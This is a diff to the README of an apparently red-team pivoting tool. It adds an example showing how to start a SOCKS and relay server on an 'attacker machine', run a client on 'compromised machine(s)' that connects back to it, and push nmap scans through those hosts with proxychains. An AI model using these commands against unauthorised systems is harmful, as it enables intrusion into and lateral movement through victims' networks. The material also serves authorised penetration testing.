@@ -32,6 +32,41 @@ The communication is encrypted in AES-CBC 256-bit.
 
 **NOTE:** Still fixing bugs in the HTTPS implementation for Windows clients, use HTTP or TCP instead until fixed.
 
+
+### Example
+
+1) Run the server in attacker machine:
+
+`$ ./vroutesrv 0.0.0.0 1080 0.0.0.0 1337 1 p@ssw0rd12345`
+
+Will start SOCKS proxy at `1080`, and relay server at `1337`.
+
+Will use protocol HTTP (`1`), and will use password `p@ssw0rd12345`.
+
+2) Run client in compromised machine(s)
+
+`$ ./vroutesrv 192.168.1.13 1337 1 p@ssw0rd12345`
+
+Relay server (attacker machine) IP address is `192.168.1.13`, and port is `1337`.
+
+Will use protocol HTTP (`1`), and will use password `p@ssw0rd12345`.
+
+3) Route traffic from your OSTs through compromised devices
+
+(Make sure to add `socks4    127.0.0.1    1080` at `/etc/proxychains.conf`)
+
+It is recommended to increase the proxychains tcp timeout. Example of values:
+
+```
+tcp_read_time_out 150000
+tcp_connect_time_out 80000
+```
+
+Finally use your OSTs:
+
+`$ proxychains nmap 10.0.2.16 -p80,8080,22,443,445,53`
+
+
 ## Installing
 
 Dependencies:
